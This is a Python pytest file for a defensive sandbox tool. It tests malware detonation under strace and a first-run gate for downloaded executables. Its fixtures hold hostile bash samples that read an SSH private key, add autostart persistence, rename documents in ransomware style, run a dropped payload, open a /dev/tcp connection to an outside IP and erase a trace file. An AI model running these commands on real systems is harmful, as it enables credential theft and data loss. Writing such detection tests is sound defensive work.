"""Detonación (sandbox real con strace) y decisiones de la puerta de primera ejecución."""
import os
import shutil
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from escudo import detonar, primera_ejecucion as pe  # noqa: E402

BUENO = "#!/bin/sh\necho hola\ndate\n"
MALO = """#!/bin/bash
cat "$HOME/.ssh/id_ed25519" > /dev/null
echo "[Desktop Entry]" > "$HOME/.config/autostart/x.desktop"
for f in "$HOME"/Documentos/*; do mv "$f" "$f.cifrado"; done
printf '#!/bin/sh\\necho carga\\n' > /tmp/carga && chmod +x /tmp/carga && /tmp/carga
exec 3<>/dev/tcp/203.0.113.7/4444 2>/dev/null || true
"""
TAPA = """#!/bin/bash
cat "$HOME/.ssh/id_ed25519" > /dev/null
: > /tmp/muestra/traza.txt 2>/dev/null; rm -f /tmp/muestra/traza.txt 2>/dev/null
"""

needs_tools = pytest.mark.skipif(not (shutil.which("strace") and shutil.which("bwrap")), reason="sin strace/bwrap")


@needs_tools
@pytest.mark.parametrize("src,want", [(BUENO, "limpio"), (MALO, "malicioso"), (TAPA, "malicioso")])
def test_sandbox_detonation(tmp_path, src, want):
    f = tmp_path / "prog.sh"
    f.write_text(src)
    inf = detonar.detonar(str(f), segundos=15, usar_vm=False, base_dir=tmp_path)
    assert inf.veredicto == want, inf.motivos
    if want == "malicioso" and src is MALO:
        joined = " ".join(inf.motivos)
        for k in ("secreto", "arranque", "ransomware", "ejecutó", "minería"):
            assert k in joined
    assert not list(tmp_path.glob("escudo-detonar-*"))          # nada queda en disco


def test_trace_parser_ignores_sandbox_setup():
    traza = ('10 execve("/usr/bin/bwrap", ["bwrap"], 0x0) = 0\n'
             '10 mount("tmpfs", "/tmp", "tmpfs", 0, NULL) = 0\n'
             '11 execve("/tmp/muestra/p", ["p"], 0x0) = 0\n'
             '11 connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = -1\n')
    inf = detonar.analizar_traza(traza, muestra="/tmp/muestra/p")
    assert inf.veredicto == "limpio" and inf.conexiones == ["93.184.216.34:443"]


def test_gate_decisions(tmp_path):
    allow = {"a" * 64: {"veredicto": "limpio"}, "b" * 64: {"veredicto": "malicioso"},
             "c" * 64: {"veredicto": "sospechoso", "permitido_por_usuario": 1}}
    assert pe.decide("/home/ana/proyecto/build/app", False, None, allow) == "permitir"
    assert pe.decide("/home/ana/Descargas/x", True, "a" * 64, allow) == "permitir"
    assert pe.decide("/home/ana/Descargas/x", True, "b" * 64, allow) == "denegar"
    assert pe.decide("/home/ana/Descargas/x", True, "c" * 64, allow) == "permitir"
    assert pe.decide("/home/ana/Descargas/x", True, "d" * 64, allow) == "analizar"
    assert pe.is_external("/home/ana/Descargas/juego.AppImage")
    assert pe.is_external("/run/media/ana/USB/setup")
    import tempfile
    d = Path(tempfile.mkdtemp(dir=os.path.expanduser("~")))      # fuera de /tmp (que cuenta como «de fuera»)
    own = d / "compilado"
    own.write_text("x")
    assert not pe.is_external(str(own))
    try:
        os.setxattr(own, "user.xdg.origin.url", b"https://example.com/x")
        assert pe.is_external(str(own))                            # marca de descarga del navegador
    except OSError:
        pass                                                       # sistema de archivos sin xattr de usuario
    shutil.rmtree(d)


def test_gate_analyzes_and_learns(tmp_path, monkeypatch):
    monkeypatch.setattr(detonar, "ALLOWLIST", tmp_path / "permitidos.json")
    alerts = []
    g = pe.Gate(alert=alerts.append)
    f = tmp_path / "prog"
    f.write_text("x")
    fake = detonar.Informe(veredicto="limpio", entorno="sandbox", sha256=detonar.sha256_file(str(f)))
    monkeypatch.setattr(detonar, "detonar", lambda *a, **k: fake)
    g.analyze(str(f), fake.sha256, 1000, 1000)
    assert g.allow[fake.sha256]["veredicto"] == "limpio" and "Ya puedes abrirlo" in alerts[-1].action
    assert pe.decide("/tmp/prog", True, fake.sha256, g.allow) == "permitir"
